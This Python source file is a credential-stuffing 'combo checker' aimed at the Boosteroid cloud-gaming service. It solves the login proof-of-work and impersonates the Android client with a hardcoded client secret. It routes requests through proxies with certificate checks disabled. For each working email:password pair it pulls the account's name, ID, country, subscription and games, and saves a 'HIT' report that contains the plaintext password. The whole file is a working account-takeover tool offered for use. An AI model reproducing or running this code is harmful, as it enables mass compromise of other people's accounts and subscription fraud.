
"""
Boosteroid Combo Checker (email:password)
Based on BoosteroidChecker source code
"""
import re
import json
import struct
import hashlib
import requests
from datetime import datetime
from typing import Dict, List, Tuple, Optional

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    pass


LOGIN_URL = 'https://cloud.boosteroid.com/api/v1/auth/login'
USER_URL = 'https://cloud.boosteroid.com/api/v1/user'
SUB_URL = 'https://cloud.boosteroid.com/api/v1/payments/subscriptions?active=true'
GAMES_URL = 'https://cloud.boosteroid.com/api/v1/boostore/applications/installed?controller=true&orderBy=started'

CLIENT_ID = '3'
CLIENT_SECRET = 'FWEue1aHX9pWaqksbA3f6eskbWNplTdA4wwbnrQP'
UA = 'BoosteroidAndroidClient v.1.6.25; Android 9; A5010'


def calculate_nonce(email_lower: str, password: str) -> int:
    """SHA512 proof-of-work: find counter where hash starts with 2 zero bytes."""
    string_bytes = (email_lower + password).encode('utf-8')
    data_bytes = bytearray(4 + len(string_bytes))
    data_bytes[4:] = string_bytes
    for counter in range(2147483647):
        struct.pack_into('>I', data_bytes, 0, counter)
        h = hashlib.sha512(bytes(data_bytes)).digest()
        if h[0] == 0 and h[1] == 0:
            return counter
    return -1


def check_boosteroid_combo(email: str, password: str, proxy: Optional[dict] = None) -> Tuple[str, Optional[dict]]:
    """
    Check Boosteroid email:password combo
    Returns: (status, info_dict)
    status: "HIT", "BAD", "ERROR"
    """
    try:
        session = requests.Session()

        # Step 1: Calculate nonce (SHA512 PoW)
        email_lower = email.lower()
        nonce = calculate_nonce(email_lower, password)

        if nonce == -1:
            return "ERROR", None

        # Step 2: Login — REFERENCE STYLE: Nonce HEADER mein, body mein nahi
        body = json.dumps({
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'email': email,
            'password': password,
        })

        headers = {
            'User-Agent': UA,
            'Pragma': 'no-cache',
            'Accept': 'application/json',
            'Nonce': str(nonce),
            'Content-Type': 'application/json; charset=UTF-8',
            'Host': 'cloud.boosteroid.com',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
        }

        r = session.post(
            LOGIN_URL,
            data=body,
            headers=headers,
            proxies=proxy,
            timeout=(5, 20),
            verify=False
        )

        source = r.text

        # Reference: 422 or this message = wrong credentials
        if 'We could not find those credentials.' in source or r.status_code == 422:
            return "BAD", None

        if 'access_token' not in source and '{"data":{"user"' not in source:
            return "ERROR", None

        m = re.search(r'"access_token":"', source)
        token = None
        if m:
            start = m.end()
            end = source.find('"', start)
            token = source[start:end]
        if not token:
            try:
                token = r.json().get('token') or r.json().get('access_token')
            except Exception:
                pass
        if not token:
            return "ERROR", None

        # Step 3: Get user info
        headers['Authorization'] = f'Bearer {token}'

        r2 = session.get(
            USER_URL,
            headers=headers,
            proxies=proxy,
            timeout=15,
            verify=False
        )

        user_info = {}
        if r2.status_code == 200:
            user_data = r2.json()
            user_info = {
                'email': email,
                'password': password,
                'name': user_data.get('name', user_data.get('username', 'N/A')),
                'id': user_data.get('id', 'N/A'),
                'country': user_data.get('country', 'N/A'),
            }

        # Step 4: Get subscription
        r3 = session.get(
            SUB_URL,
            headers=headers,
            proxies=proxy,
            timeout=15,
            verify=False
        )

        sub_info = {
            'plan': 'Free',
            'is_premium': False,
            'expiry': 'N/A',
            'status': 'N/A'
        }

        if r3.status_code == 200:
            sub_data = r3.json()
            if isinstance(sub_data, list) and len(sub_data) > 0:
                sub = sub_data[0]
                sub_info['plan'] = sub.get('plan', 'Unknown')
                sub_info['status'] = sub.get('status', 'Unknown')
                sub_info['expiry'] = sub.get('expires_at', 'N/A')
                sub_info['is_premium'] = sub_info['status'] == 'active'
            elif isinstance(sub_data, dict):
                sub_info['plan'] = sub_data.get('plan', 'Unknown')
                sub_info['status'] = sub_data.get('status', 'Unknown')
                sub_info['expiry'] = sub_data.get('expires_at', 'N/A')
                sub_info['is_premium'] = sub_info['status'] == 'active'

        # Step 5: Get installed games count
        r4 = session.get(
            GAMES_URL,
            headers=headers,
            proxies=proxy,
            timeout=15,
            verify=False
        )

        games_count = 0
        if r4.status_code == 200:
            games_data = r4.json()
            if isinstance(games_data, list):
                games_count = len(games_data)
            elif isinstance(games_data, dict):
                games_count = len(games_data.get('items', []))

        info = {
            **user_info,
            **sub_info,
            'games_count': games_count
        }

        return "HIT", info

    except requests.exceptions.ProxyError:
        return "ERROR", None
    except:
        return "ERROR", None


def format_hit_boosteroid_combo(info: dict, source: str) -> Tuple[str, str]:
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    content = f"""════════════════════════════════════════════════════════
  WHITE Boosteroid Combo Checker  |  Owner: @ADI_WT
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

════════════════════════════════════════════════════════
  ACCOUNT INFO
════════════════════════════════════════════════════════

  Email      : {info.get('email', 'N/A')}
  Password   : {info.get('password', 'N/A')}
  Name       : {info.get('name', 'N/A')}
  ID         : {info.get('id', 'N/A')}
  Country    : {info.get('country', 'N/A')}

════════════════════════════════════════════════════════
  SUBSCRIPTION
════════════════════════════════════════════════════════

  Plan       : {info.get('plan', 'N/A')}
  Status     : {info.get('status', 'N/A')}
  Premium    : {'Yes' if info.get('is_premium') else 'No'}
  Expiry     : {info.get('expiry', 'N/A')}
  Games      : {info.get('games_count', 0)}

════════════════════════════════════════════════════════
  Owner: @ADI_WT | WHITE Boosteroid Combo Checker
════════════════════════════════════════════════════════
"""
    safe_email = re.sub(r'[<>:"/\\|?*\s]', '_', info.get("email", "unknown"))
    filename = f"[boosteroid_{safe_email}].txt"
    return content, filename
